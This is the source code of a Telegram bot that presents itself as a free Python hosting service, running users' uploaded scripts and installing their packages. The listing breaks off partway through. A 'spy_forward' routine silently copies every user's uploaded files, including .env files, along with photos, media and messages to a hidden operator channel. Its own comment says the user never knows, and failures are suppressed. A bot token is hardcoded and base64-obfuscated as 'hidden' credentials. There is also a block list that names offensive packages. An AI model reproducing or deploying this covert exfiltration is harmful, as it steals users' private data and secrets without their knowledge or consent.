#!/usr/bin/env python3
# ============================================================================
#  SODO HOSTING BOT  v3.0.0  —  DEV BY SODO
#  Silent spy · Force join · Auto pip · Ping · Owner panel
#  Broadcast (instant + scheduled) · Ban/Unban · Stats
#  Welcome editor · File type control · Auto delete · Storage limit
# ============================================================================

# ── BOOTSTRAP ────────────────────────────────────────────────────────────────
import subprocess, sys, os, base64 as _b64

def _bootstrap():
    need = {
        "telegram": "python-telegram-bot[job-queue]==20.7",
        "psutil":   "psutil",
        "requests": "requests",
    }
    hit = False
    for mod, pkg in need.items():
        try: __import__(mod)
        except ImportError:
            print(f"  installing {pkg}...", flush=True)
            subprocess.check_call([sys.executable, "-m", "pip", "install", pkg,
                                   "-q", "--break-system-packages"],
                                  stderr=subprocess.DEVNULL)
            hit = True
    if hit:
        os.execv(sys.executable, [sys.executable] + sys.argv)

_bootstrap()

# ── IMPORTS ───────────────────────────────────────────────────────────────────
import ast, re, json, time, uuid, shutil, signal, zipfile
import threading, secrets, sqlite3, logging, asyncio
from io import BytesIO
from datetime import datetime, timezone, timedelta
from functools import wraps

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters,
)
from telegram.constants import ParseMode
import psutil

# ── CREDENTIALS (hidden) ─────────────────────────────────────────────────────
_A = "ODYyNzkyOTk3MTpBQUVSMHFlRmZDMk5TaGNLc0lHY2hRUEdvZldxZTF1U1JQQQ=="
_B = "ODYwOTEyNzE2NA=="

BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN") or _b64.b64decode(_A).decode()
OWNER_ID  = os.environ.get("OWNER_TELEGRAM_ID")  or _b64.b64decode(_B).decode()

# ── CONFIG ────────────────────────────────────────────────────────────────────
DATA_DIR     = os.environ.get("DATA_DIR",
               os.path.join(os.path.dirname(os.path.abspath(__file__)), "data"))
DB_PATH      = os.path.join(DATA_DIR, "sodo.db")
APPS_DIR     = os.path.join(DATA_DIR, "apps")
LOGS_DIR     = os.path.join(DATA_DIR, "logs")
MAX_FILE_MB  = int(os.environ.get("MAX_FILE_MB",  "15"))
MAX_DEP_SECS = int(os.environ.get("DEP_TIMEOUT", "120"))
UPLOAD_LIMIT = int(os.environ.get("UPLOAD_LIMIT",  "2"))
SPY_CHANNEL  = int(os.environ.get("SPY_CHANNEL_ID", "-1004318208040"))
MAX_LOG_CHARS = 3800

FORCE_JOIN_CHANNELS = ["@sodohuyall0", "@DarkEmpirej", SPY_CHANNEL]

CHANNEL_URLS = {
    "sodo":  "https://t.me/sodohuyall0",
    "gc":    "https://t.me/+PmUACNgQvlI3Yzgx",
    "dark":  "https://t.me/DarkEmpirej",
}

APP_NAME = "SODO HOSTING BOT"
BRAND    = "DEV BY SODO"
VERSION  = "3.0.0"

ALLOWED_EXT_DEFAULT = {"py","zip","txt","json","env","cfg","ini","toml","yaml","yml"}

for _d in (DATA_DIR, APPS_DIR, LOGS_DIR):
    os.makedirs(_d, exist_ok=True)

# ── LOGGING: suppress all, only show startup ──────────────────────────────────
logging.disable(logging.CRITICAL)
log = logging.getLogger("sodo")

# ── FONT UTILS (small caps) ───────────────────────────────────────────────────
_F = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
_T = "ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘQʀꜱᴛᴜᴠᴡxʏᴢᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘQʀꜱᴛᴜᴠᴡxʏᴢ"
_M = str.maketrans(_F, _T)

def sc(t: str) -> str: return t.translate(_M)
def bold(t: str) -> str: return f"<b>{t}</b>"
def code(t: str) -> str: return f"<code>{t}</code>"
def esc(t: str) -> str:
    return str(t).replace("&","&amp;").replace("<","&lt;").replace(">","&gt;")

# ── DATABASE ──────────────────────────────────────────────────────────────────
_db_lock = threading.Lock()
_db_conn = None

def _open_conn():
    c = sqlite3.connect(DB_PATH, timeout=20, check_same_thread=False)
    c.row_factory = sqlite3.Row
    c.execute("PRAGMA journal_mode=WAL")
    c.execute("PRAGMA busy_timeout=15000")
    return c

def db():
    global _db_conn
    if _db_conn is None:
        _db_conn = _open_conn()
    return _db_conn

def q(sql, args=(), one=False):
    with _db_lock:
        cur = db().execute(sql, args)
        rows = cur.fetchall(); cur.close()
        return (rows[0] if rows else None) if one else rows

def ex(sql, args=()):
    with _db_lock:
        db().execute(sql, args); db().commit()

_SCHEMA = """
CREATE TABLE IF NOT EXISTS users(
  tg_id TEXT PRIMARY KEY, first_name TEXT, username TEXT,
  role TEXT DEFAULT 'user', banned INTEGER DEFAULT 0,
  files_count INTEGER DEFAULT 0, storage_bytes INTEGER DEFAULT 0,
  joined_at TEXT, last_seen TEXT);

CREATE TABLE IF NOT EXISTS apps(
  id TEXT PRIMARY KEY, owner TEXT NOT NULL, name TEXT, entry TEXT,
  status TEXT DEFAULT 'stopped', autorestart INTEGER DEFAULT 1,
  restarts INTEGER DEFAULT 0, crashes INTEGER DEFAULT 0,
  last_start TEXT, last_exit TEXT, last_fail TEXT, created_at TEXT);

CREATE TABLE IF NOT EXISTS user_files(
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  user_id TEXT, file_id TEXT, file_name TEXT,
  file_type TEXT, file_size INTEGER, uploaded_at TEXT, delete_at TEXT);

CREATE TABLE IF NOT EXISTS broadcasts(
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  message TEXT, scheduled_at TEXT, sent INTEGER DEFAULT 0, created_at TEXT);

CREATE TABLE IF NOT EXISTS settings(key TEXT PRIMARY KEY, value TEXT);
"""

_DEFAULTS = {
    "welcome_text":    f"✦ {sc('SODO HOSTING BOT')} ✦\n{sc('dev by sodo')}\n\n{sc('welcome')} {{name}}! 👋\n\n{sc('drop any .py or .zip file to deploy.')}",
    "welcome_video":   "",
    "bot_name":        sc("SODO HOSTING BOT"),
    "bot_tagline":     sc("dev by sodo"),
    "notify_new_user": "1",
    "maintenance":     "0",
    "max_storage_mb":  "100",
    "allowed_ext":     json.dumps(sorted(ALLOWED_EXT_DEFAULT)),
    "auto_delete_hrs": "0",
}

def init_db():
    with _db_lock:
        c = _open_conn()
        c.executescript(_SCHEMA)
        if not c.execute("SELECT 1 FROM users WHERE tg_id=?", (OWNER_ID,)).fetchone():
            c.execute("INSERT INTO users(tg_id,role,joined_at,last_seen) VALUES(?,?,?,?)",
                      (OWNER_ID,"owner",_now(),_now()))
        for k,v in _DEFAULTS.items():
            if not c.execute("SELECT 1 FROM settings WHERE key=?", (k,)).fetchone():
                c.execute("INSERT INTO settings VALUES(?,?)", (k,v))
        c.commit(); c.close()

def setting(key: str) -> str:
    row = q("SELECT value FROM settings WHERE key=?", (key,), one=True)
    return row["value"] if row else _DEFAULTS.get(key,"")

def set_setting(key: str, val: str):
    ex("INSERT OR REPLACE INTO settings VALUES(?,?)", (key, val))

def _now() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")

def allowed_ext() -> set:
    try:    return set(json.loads(setting("allowed_ext")))
    except: return ALLOWED_EXT_DEFAULT

def ensure_user(tg_id: str, u=None):
    tid  = str(tg_id)
    fn   = (u.first_name or "") if u else ""
    un   = (u.username   or "") if u else ""
    if not q("SELECT 1 FROM users WHERE tg_id=?", (tid,), one=True):
        ex("INSERT INTO users(tg_id,first_name,username,role,joined_at,last_seen) VALUES(?,?,?,?,?,?)",
           (tid, fn, un, "owner" if tid == OWNER_ID else "user", _now(), _now()))
    else:
        ex("UPDATE users SET last_seen=?,first_name=?,username=? WHERE tg_id=?",
           (_now(), fn, un, tid))

# ── PROCESS MANAGER ───────────────────────────────────────────────────────────
PROCS: dict = {}
PROC_LOCK = threading.Lock()

def app_dir(aid):  return os.path.join(APPS_DIR, aid)
def app_log(aid):  return os.path.join(LOGS_DIR, f"{aid}.log")
def deps_dir(aid): return os.path.join(app_dir(aid), "deps")

def log_append(aid, line):
    p = app_log(aid)
    try:
        if os.path.exists(p) and os.path.getsize(p) > 512*1024:
            d = open(p,"rb").read()[-(256*1024):]
            open(p,"wb").write(d)
        with open(p,"a",encoding="utf-8",errors="replace") as f:
            f.write(f"[{_now()}] {line}\n")
    except Exception: pass

def build_env(aid):
    return {
        "PATH":                    os.environ.get("PATH","/usr/bin:/usr/local/bin"),
        "HOME":                    app_dir(aid),
        "PYTHONUNBUFFERED":        "1",
        "PYTHONDONTWRITEBYTECODE": "1",
        "PYTHONPATH":              deps_dir(aid),
        "PORT":                    str(20000 + (int(aid[:6],16) % 20000)),
    }

def _detect_entry(aid):
    d = app_dir(aid)
    if not os.path.isdir(d): return None
    pyf = [f for f in os.listdir(d) if f.endswith(".py") and f != "__init__.py"]
    if not pyf: return None
    for p in ("app.py","main.py","bot.py","run.py","start.py","index.py"):
        if p in pyf: return p
    return pyf[0]

def proc_start(aid):
    a = q("SELECT * FROM apps WHERE id=?", (aid,), one=True)
    if not a: return False, sc("app not found")
    with PROC_LOCK:
        if aid in PROCS and PROCS[aid]["popen"].poll() is None:
            return False, sc("already running")
        entry = a["entry"] or _detect_entry(aid)
        if not entry: return False, sc("no .py file found")
        if not os.path.exists(os.path.join(app_dir(aid), entry)):
            return False, sc(f"entry '{entry}' missing")
        try:
            p = subprocess.Popen(
                [sys.executable, entry], cwd=app_dir(aid), env=build_env(aid),
                stdout=open(app_log(aid),"ab"), stderr=subprocess.STDOUT,
                start_new_session=True)
        except Exception as e:
            ex("UPDATE apps SET status='failed',last_fail=? WHERE id=?", (str(e),aid))
            return False, str(e)
        PROCS[aid] = {"popen": p, "started": time.time()}
        ex("UPDATE apps SET status='running',last_start=?,last_exit=NULL,entry=? WHERE id=?",
           (_now(), entry, aid))
        log_append(aid, f"STARTED pid={p.pid}")
        return True, sc(f"started (pid {p.pid})")

def proc_stop(aid):
    if not q("SELECT 1 FROM apps WHERE id=?", (aid,), one=True): return
    with PROC_LOCK:
        pr = PROCS.pop(aid, None)
        if pr and pr["popen"].poll() is None:
            try: os.killpg(pr["popen"].pid, signal.SIGTERM)
            except Exception:
                try: pr["popen"].kill()
                except Exception: pass
            try: pr["popen"].wait(timeout=8)
            except Exception: pass
            log_append(aid, "STOPPED")
    ex("UPDATE apps SET status='stopped' WHERE id=?", (aid,))

def app_running(aid):
    with PROC_LOCK:
        return aid in PROCS and PROCS[aid]["popen"].poll() is None

def status_emoji(aid, db_status):
    if app_running(aid): return "🟢"
    return {"running":"🟢","starting":"🟡","failed":"❌","stopped":"🔴"}.get(db_status,"⚫")

# ── PACKAGE SCANNER ───────────────────────────────────────────────────────────
_STDLIB = set(sys.stdlib_module_names) if hasattr(sys,"stdlib_module_names") else set()

BLOCKED_PKGS = {
    "scapy","impacket","mitmproxy","python-nmap","nmap","pwntools",
    "pynput","keyboard","pyautogui","sqlmap","masscan","shodan",
    "frida","angr","bitcoin","pycoin","paramiko",
}

_PIP_MAP = {
    "cv2":"opencv-python","PIL":"Pillow","sklearn":"scikit-learn",
    "bs4":"beautifulsoup4","dateutil":"python-dateutil","dotenv":"python-dotenv",
    "yaml":"pyyaml","Crypto":"pycryptodome","telegram":"python-telegram-bot",
    "flask":"Flask","aiohttp":"aiohttp","fastapi":"fastapi","uvicorn":"uvicorn",
    "httpx":"httpx","rich":"rich","click":"click","typer":"typer",
    "pymongo":"pymongo","redis":"redis","jwt":"PyJWT","discord":"discord.py",
    "motor":"motor","celery":"celery","pydantic":"pydantic",
}

def extract_imports(src):
    raw = set()
    try:
        tree = ast.parse(src)
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                for a in node.names: raw.add(a.name.split(".")[0])
            elif isinstance(node, ast.ImportFrom):
                if node.module: raw.add(node.module.split(".")[0])
    except SyntaxError:
        for m in re.finditer(r"^\s*(?:import|from)\s+([\w]+)", src, re.M):
            raw.add(m.group(1))
    res = set()
    for p in raw:
        if p in ("__future__","__main__",""): continue
        pip = _PIP_MAP.get(p, p)
        if pip.lower() not in _STDLIB: res.add(pip)
    return res

def split_pkgs(pkgs):
    blocked = {p for p in pkgs if p.lower() in BLOCKED_PKGS}
    return pkgs - blocked, blocked

def install_pkgs(aid, pkgs):
    if not pkgs: return True, sc("nothing to install")
    os.makedirs(deps_dir(aid), exist_ok=True)
    log_append(aid, f"DEPS: {sorted(pkgs)}")
    try:
        r = subprocess.run(
            [sys.executable,"-m","pip","install",*sorted(pkgs),
             "--target",deps_dir(aid),"-q","--disable-pip-version-check",
             "--break-system-packages"],
            capture_output=True, text=True, timeout=MAX_DEP_SECS,
            env={"PATH":os.environ.get("PATH",""),"HOME":app_dir(aid)})
        log_append(aid, f"DEPS exit={r.returncode}")
        return r.returncode == 0, (r.stdout+r.stderr)[-2000:] or "ok"
    except subprocess.TimeoutExpired: return False, sc("pip timeout")
    except Exception as e:            return False, str(e)

def install_requirements(aid):
    req = os.path.join(app_dir(aid), "requirements.txt")
    if not os.path.exists(req): return True, sc("no requirements.txt")
    lines = {l.strip() for l in open(req).read().splitlines()
             if l.strip() and not l.strip().startswith("#")}
    safe, _ = split_pkgs(lines)
    return install_pkgs(aid, safe)

# ── FORCE JOIN ────────────────────────────────────────────────────────────────
async def check_joined(bot, user_id: int) -> bool:
    for ch in FORCE_JOIN_CHANNELS:
        try:
            m = await bot.get_chat_member(chat_id=ch, user_id=user_id)
            if m.status in ("kicked","left"): return False
        except Exception: pass
    return True

async def send_join_gate(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    text = (
        f"⚠️ {bold(sc('Join Required'))}\n\n"
        f"{sc('Join all channels below to use this bot.')}\n"
        f"{sc('After joining, tap')} ✅ {sc('Check.')}"
    )
    kb = InlineKeyboardMarkup([
        [ILB("📢 " + sc("Sodo Channel"),   CHANNEL_URLS["sodo"])],
        [ILB("💬 " + sc("Dark Empire GC"), CHANNEL_URLS["gc"])],
        [ILB("🔗 " + sc("Dark Empire Ch"), CHANNEL_URLS["dark"])],
        [IB("✅ " + sc("Check Now"), "check_join")],
    ])
    m = update.message or (update.callback_query.message if update.callback_query else None)
    if m: await m.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)

# ── SPY CHANNEL ───────────────────────────────────────────────────────────────
async def spy_forward(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Silent forward of any user message to spy channel. User never knows."""
    try:
        u    = update.effective_user
        uid  = str(u.id)
        msg  = update.message
        if not msg or uid == OWNER_ID: return

        name  = esc(f"{u.first_name or ''} {u.last_name or ''}".strip())
        uname = esc(f"@{u.username}" if u.username else sc("no username"))
        t_str = datetime.now(timezone.utc).strftime("%d %b %Y  %H:%M UTC")

        header = (
            f"🔴 {bold(sc('New Activity'))}\n"
            f"{'━'*20}\n"
            f"👤 {bold(name)}\n"
            f"📛 {uname}  ·  🆔 {code(uid)}\n"
            f"⏰ {t_str}\n"
            f"{'━'*20}"
        )

        if msg.document:
            fname = msg.document.file_name or sc("file")
            fsize = msg.document.file_size or 0
            cap   = header + f"\n📎 {bold(esc(fname))}  ({round(fsize/1024,1)} KB)"
            await ctx.bot.copy_message(
                chat_id=SPY_CHANNEL, from_chat_id=msg.chat_id,
                message_id=msg.message_id, caption=cap, parse_mode=ParseMode.HTML)
            ex("INSERT INTO user_files(user_id,file_id,file_name,file_type,file_size,uploaded_at,delete_at) VALUES(?,?,?,?,?,?,?)",
               (uid, msg.document.file_id, fname, "document", fsize, _now(), _auto_del_at()))
            ex("UPDATE users SET files_count=files_count+1,storage_bytes=storage_bytes+? WHERE tg_id=?",
               (fsize, uid))

        elif msg.photo:
            cap = header + f"\n🖼 {bold(sc('Photo'))}"
            await ctx.bot.copy_message(
                chat_id=SPY_CHANNEL, from_chat_id=msg.chat_id,
                message_id=msg.message_id, caption=cap, parse_mode=ParseMode.HTML)

        elif msg.video:
            cap = header + f"\n🎬 {bold(sc('Video'))}"
            await ctx.bot.copy_message(
                chat_id=SPY_CHANNEL, from_chat_id=msg.chat_id,
                message_id=msg.message_id, caption=cap, parse_mode=ParseMode.HTML)

        elif msg.audio or msg.voice:
            cap = header + f"\n🎵 {bold(sc('Audio'))}"
            await ctx.bot.copy_message(
                chat_id=SPY_CHANNEL, from_chat_id=msg.chat_id,
                message_id=msg.message_id, caption=cap, parse_mode=ParseMode.HTML)

        elif msg.text and not msg.text.startswith("/"):
            await ctx.bot.send_message(
                SPY_CHANNEL,
                header + f"\n💬 {bold(sc('Text'))}\n{esc(msg.text[:500])}",
                parse_mode=ParseMode.HTML)

    except Exception: pass   # never surface to user

def _auto_del_at():
    hrs = int(setting("auto_delete_hrs") or 0)
    if hrs <= 0: return ""
    return (datetime.now(timezone.utc) + timedelta(hours=hrs)).strftime("%Y-%m-%d %H:%M:%S")

# ── STATE MANAGER ─────────────────────────────────────────────────────────────
STATES: dict = {}
def set_state(uid, state, **data): STATES[uid] = {"state": state, **data}
def get_state(uid): return STATES.get(uid)
def clear_state(uid): STATES.pop(uid, None)

# ── KEYBOARD HELPERS ──────────────────────────────────────────────────────────
def IB(text, data):  return InlineKeyboardButton(text, callback_data=data)
def ILB(text, url):  return InlineKeyboardButton(text, url=url)

def kb_main(is_owner=False):
    rows = []
    if is_owner:
        rows.append([IB("👑 " + sc("Owner Panel"), "owner:panel")])
    rows.append([
        IB("📦 " + sc("My Apps"), "menu:apps"),
        IB("⚡ " + sc("Ping"),    "menu:ping"),
    ])
    rows.append([
        ILB("📢 " + sc("Channel"),    CHANNEL_URLS["sodo"]),
        ILB("💬 " + sc("Group"),       CHANNEL_URLS["gc"]),
    ])
    rows.append([ILB("🔗 " + sc("Dark Empire"), CHANNEL_URLS["dark"])])
    return InlineKeyboardMarkup(rows)

def kb_app(aid, status):
    running = app_running(aid)
    r1 = []
    if running:
        r1 += [IB("■ " + sc("Stop"),    f"app:stop:{aid}"),
               IB("🔄 " + sc("Restart"), f"app:restart:{aid}")]
    else:
        r1.append(IB("▶ " + sc("Start"), f"app:start:{aid}"))
    r1.append(IB("📜 " + sc("Logs"), f"app:logs:{aid}"))
    return InlineKeyboardMarkup([
        r1,
        [IB("🗑 " + sc("Delete"), f"app:delete:{aid}"),
         IB("🔙 " + sc("Apps"),   "menu:apps")],
    ])

def kb_del_confirm(aid):
    return InlineKeyboardMarkup([[
        IB("✅ " + sc("Yes Delete"), f"app:del_ok:{aid}"),
        IB("❌ " + sc("Cancel"),     f"app:show:{aid}"),
    ]])

def kb_run_prompt(aid):
    return InlineKeyboardMarkup([[
        IB("▶ " + sc("Run Now"), f"app:run_yes:{aid}"),
        IB(sc("Not Now"),         f"app:run_no:{aid}"),
    ]])

def kb_owner():
    return InlineKeyboardMarkup([
        [IB("👥 " + sc("Users"),       "owner:users"),
         IB("📊 " + sc("Stats"),       "owner:stats")],
        [IB("📢 " + sc("Broadcast"),   "owner:broadcast"),
         IB("⏰ " + sc("Schedule"),    "owner:sched")],
        [IB("✏️ " + sc("Edit Welcome"),  "owner:edit_welcome")],
        [IB("⚙️ " + sc("Settings"),      "owner:settings")],
        [IB("🛠 " + sc("Maintenance"),   "owner:maint_toggle"),
         IB("🔙 " + sc("Main"),          "menu:main")],
    ])

def kb_settings():
    return InlineKeyboardMarkup([
        [IB("📏 " + sc("Storage Limit"), "owner:set_storage"),
         IB("⏱ " + sc("Auto Delete"),   "owner:set_autodel")],
        [IB("📂 " + sc("File Types"),    "owner:set_filetypes")],
        [IB("🔔 " + sc("User Notify"),   "owner:toggle_notify")],
        [IB("🔙 " + sc("Owner Panel"),   "owner:panel")],
    ])

def kb_welcome_edit():
    return InlineKeyboardMarkup([
        [IB("📝 " + sc("Edit Text"),  "owner:set_wtext"),
         IB("🎬 " + sc("Set Video"),  "owner:set_wvideo")],
        [IB("🤖 " + sc("Bot Name"),   "owner:set_bname"),
         IB("✨ " + sc("Tagline"),    "owner:set_tagline")],
        [IB("🔙 " + sc("Owner Panel"), "owner:panel")],
    ])

# ── MESSAGE CARDS ─────────────────────────────────────────────────────────────
def app_card(a) -> str:
    aid    = a["id"]
    status = "running" if app_running(aid) else a["status"]
    em     = status_emoji(aid, a["status"])
    entry  = a["entry"] or _detect_entry(aid) or "?"
    lines  = [
        bold(esc(a["name"])),
        f"{em} {code(status)}  ·  {code(entry)}",
        f"{sc('restarts')}: {a['restarts']}  ·  {sc('crashes')}: {a['crashes']}",
    ]
    if app_running(aid) and aid in PROCS:
        s = int(time.time() - PROCS[aid]["started"])
        h,r = divmod(s,3600); m2,s2 = divmod(r,60)
        lines.append(f"⏱ {sc('uptime')}: {h}h {m2}m {s2}s")
    if a["last_start"]: lines.append(f"{sc('last start')}: {code(a['last_start'])}")
    if a["last_fail"]:  lines.append(f"⚠️ {code(a['last_fail'][:60])}")
    return "\n".join(lines)

def welcome_caption(u) -> str:
    txt = setting("welcome_text")
    return (txt
            .replace("{name}", bold(esc(u.first_name or "")))
            .replace("{id}",   code(str(u.id))))

# ── GATE ──────────────────────────────────────────────────────────────────────
async def gate(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> bool:
    u   = update.effective_user
    uid = str(u.id)
    ensure_user(uid, u)
    row = q("SELECT banned FROM users WHERE tg_id=?", (uid,), one=True)
    if row and row["banned"]:
        m = update.message or (update.callback_query.message if update.callback_query else None)
        if m: await m.reply_text(f"🚫 {sc('You are banned from this bot.')}")
        return False
    if uid != OWNER_ID and setting("maintenance") == "1":
        m = update.message or (update.callback_query.message if update.callback_query else None)
        if m: await m.reply_text(f"🛠 {sc('Bot under maintenance. Try later.')}")
        return False
    if uid != OWNER_ID and not await check_joined(ctx.bot, u.id):
        await send_join_gate(update, ctx)
        return False
    return True

# ── HANDLERS ──────────────────────────────────────────────────────────────────
async def on_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    u   = update.effective_user
    uid = str(u.id)
    ensure_user(uid, u)

    # ban check
    row = q("SELECT banned FROM users WHERE tg_id=?", (uid,), one=True)
    if row and row["banned"]:
        await update.message.reply_text(f"🚫 {sc('You are banned.')}"); return

    if setting("maintenance") == "1" and uid != OWNER_ID:
        await update.message.reply_text(f"🛠 {sc('Maintenance mode. Try later.')}"); return

    if uid != OWNER_ID and not await check_joined(ctx.bot, u.id):
        await send_join_gate(update, ctx); return

    # check if new user
    cnt = q("SELECT COUNT(*) as c FROM user_files WHERE user_id=?", (uid,), one=True)["c"]
    is_new = cnt == 0 and not q("SELECT 1 FROM users WHERE tg_id=? AND last_seen!=joined_at",
                                  (uid,), one=True)

    apps    = q("SELECT id,status FROM apps WHERE owner=?", (uid,))
    running = sum(1 for a in apps if app_running(a["id"]))
    is_own  = uid == OWNER_ID

    caption = (
        f"{bold(esc(setting('bot_name')))}\n"
        f"{esc(setting('bot_tagline'))}\n\n"
        f"👤 {bold(esc(u.first_name or ''))}  •  🆔 {code(uid)}\n"
        f"📦 {sc('apps')}: {len(apps)}/{UPLOAD_LIMIT}  •  🟢 {running} {sc('running')}\n\n"
        + welcome_caption(u) +
        f"\n\n📤 {sc('Drop any')} <code>.py</code> {sc('or')} <code>.zip</code> {sc('to deploy.')}"
    )

    wv = setting("welcome_video")
    kb = kb_main(is_own)
    try:
        if wv:
            await update.message.reply_video(
                video=wv, caption=caption, parse_mode=ParseMode.HTML, reply_markup=kb)
        else:
            await update.message.reply_text(caption, parse_mode=ParseMode.HTML, reply_markup=kb)
    except Exception:
        await update.message.reply_text(caption, parse_mode=ParseMode.HTML, reply_markup=kb)

    # notify owner of new user
    if is_new and uid != OWNER_ID and setting("notify_new_user") == "1":
        try:
            un = f"@{u.username}" if u.username else sc("no username")
            await ctx.bot.send_message(
                OWNER_ID,
                f"🆕 {bold(sc('New User'))}\n"
                f"👤 {bold(esc(u.first_name or ''))}\n"
                f"📛 {esc(un)}  ·  🆔 {code(uid)}\n"
                f"⏰ {_now()}",
                parse_mode=ParseMode.HTML)
        except Exception: pass


async def on_ping(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not await gate(update, ctx): return
    t0 = time.time()
    m  = await update.message.reply_text("⏱ ...")
    ms = round((time.time() - t0) * 1000)
    qual = "🟢" if ms < 300 else ("🟡" if ms < 700 else "🔴")
    await m.edit_text(
        f"⚡ {bold(sc('Ping Test'))}\n\n"
        f"🏓 {bold(str(ms) + ' ms')} {qual}\n"
        f"{sc('bot is online and responding.')}",
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup([[IB("🔙 " + sc("Back"), "menu:main")]]))


async def on_apps_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not await gate(update, ctx): return
    await _show_apps(update, str(update.effective_user.id), edit=False)


async def on_logs_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not await gate(update, ctx): return
    uid  = str(update.effective_user.id)
    apps = q("SELECT * FROM apps WHERE owner=? ORDER BY created_at DESC", (uid,))
    if not apps:
        await update.message.reply_text(sc("No apps yet.")); return
    a   = apps[0]
    p   = app_log(a["id"])
    txt = open(p, encoding="utf-8", errors="replace").read()[-MAX_LOG_CHARS:] if os.path.exists(p) else sc("(empty)")
    await update.message.reply_text(
        f"📜 {bold(esc(a['name']))} — {sc('log')}\n<pre>{esc(txt)}</pre>",
        parse_mode=ParseMode.HTML, reply_markup=kb_app(a["id"], a["status"]))


async def on_file(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    u   = update.effective_user
    uid = str(u.id)

    # owner in set_wvideo state → intercept for welcome video
    if uid == OWNER_ID:
        st = get_state(uid)
        if st and st.get("state") == "set_wvideo":
            vid = update.message.video or update.message.document
            if vid:
                set_setting("welcome_video", vid.file_id)
                clear_state(uid)
                await update.message.reply_text(
                    f"✅ {sc('Welcome video saved!')}",
                    reply_markup=kb_owner())
                return

    if not await gate(update, ctx): return
    asyncio.create_task(spy_forward(update, ctx))   # silent

    doc = update.message.document
    if not doc: return

    fname = doc.file_name or "upload.py"
    ext   = fname.rsplit(".",1)[-1].lower() if "." in fname else ""

    if ext not in allowed_ext():
        await update.message.reply_text(
            f"⚠️ {sc('.') + ext} {sc('not allowed.')}\n"
            f"{sc('Allowed')}: {code(', '.join(sorted(allowed_ext())))}",
            parse_mode=ParseMode.HTML); return

    if doc.file_size and doc.file_size > MAX_FILE_MB * 1024 * 1024:
        await update.message.reply_text(
            f"⚠️ {sc('File exceeds')} {MAX_FILE_MB} MB"); return

    urow = q("SELECT storage_bytes FROM users WHERE tg_id=?", (uid,), one=True)
    max_b = int(setting("max_storage_mb")) * 1024 * 1024
    if urow and urow["storage_bytes"] >= max_b:
        await update.message.reply_text(
            f"⚠️ {sc('Storage limit reached')} ({setting('max_storage_mb')} MB)"); return

    if ext == "py" and len(q("SELECT id FROM apps WHERE owner=?", (uid,))) >= UPLOAD_LIMIT:
        await update.message.reply_text(
            f"⚠️ {sc('App limit')} ({UPLOAD_LIMIT}). {sc('Delete one from')} 📦"); return

    prog = await update.message.reply_text("⬇️ " + sc("downloading..."))
    tg_f = await doc.get_file()
    buf  = BytesIO(); await tg_f.download_to_memory(buf); data = buf.getvalue()

    # ── .py ──────────────────────────────────────────────────────────────────
    if ext == "py":
        aid   = uuid.uuid4().hex[:12]
        aname = re.sub(r"[^a-zA-Z0-9\-]","−",fname.removesuffix(".py"))[:32].strip("-") or "app"
        os.makedirs(app_dir(aid), exist_ok=True)
        with open(os.path.join(app_dir(aid), fname),"wb") as f: f.write(data)
        ex("INSERT INTO apps(id,owner,name,entry,created_at) VALUES(?,?,?,?,?)",
           (aid,uid,aname,fname,_now()))
        log_append(aid, f"UPLOADED {fname}")

        await prog.edit_text(
            f"✅ {code(fname)}\n🔍 {sc('scanning imports...')}",
            parse_mode=ParseMode.HTML)

        try:    pkgs = extract_imports(data.decode("utf-8",errors="replace"))
        except: pkgs = set()

        parts = []
        if pkgs:
            safe, blocked = split_pkgs(pkgs)
            if blocked:
                parts.append(f"⚠️ {sc('blocked')}: {code(', '.join(sorted(blocked)))}")
                try:
                    await ctx.bot.send_message(
                        OWNER_ID,
                        f"⚠️ {bold(sc('Dep Approval Needed'))}\n"
                        f"{sc('app')}: {code(aname)}  {sc('user')}: {code(uid)}\n"
                        f"{sc('pkgs')}: {code(', '.join(sorted(blocked)))}",
                        parse_mode=ParseMode.HTML)
                except Exception: pass
            if safe:
                await prog.edit_text(
                    f"📦 {sc('installing')}: {code(', '.join(sorted(safe)))}...",
                    parse_mode=ParseMode.HTML)
                loop = asyncio.get_event_loop()
                ok_p, _ = await loop.run_in_executor(None, lambda s=safe: install_pkgs(aid,s))
                parts.append(
                    f"✅ {sc('installed')}: {code(', '.join(sorted(safe)))}"
                    if ok_p else
                    f"❌ {sc('pip failed')}")
            if not parts:
                parts.append(f"ℹ️ {sc('no external packages.')}")
        else:
            parts.append(f"ℹ️ {sc('no imports detected.')}")

        ex("UPDATE apps SET entry=? WHERE id=?", (fname, aid))
        await prog.edit_text(
            f"✦ {bold(esc(aname))}  ·  {code(fname)} {sc('ready')}\n\n"
            + "\n".join(parts) +
            f"\n\n▶ {sc('Run it now?')}",
            parse_mode=ParseMode.HTML,
            reply_markup=kb_run_prompt(aid))

    # ── .zip ─────────────────────────────────────────────────────────────────
    elif ext == "zip":
        existing = q("SELECT * FROM apps WHERE owner=? ORDER BY created_at DESC", (uid,))
        if existing:
            aid, aname = existing[0]["id"], existing[0]["name"]
        else:
            if len(q("SELECT id FROM apps WHERE owner=?", (uid,))) >= UPLOAD_LIMIT:
                await prog.edit_text(f"⚠️ {sc('App limit reached.')}"); return
            aid   = uuid.uuid4().hex[:12]
            aname = re.sub(r"[^a-zA-Z0-9\-]","-",fname.removesuffix(".zip"))[:32].strip("-") or "app"
            os.makedirs(app_dir(aid), exist_ok=True)
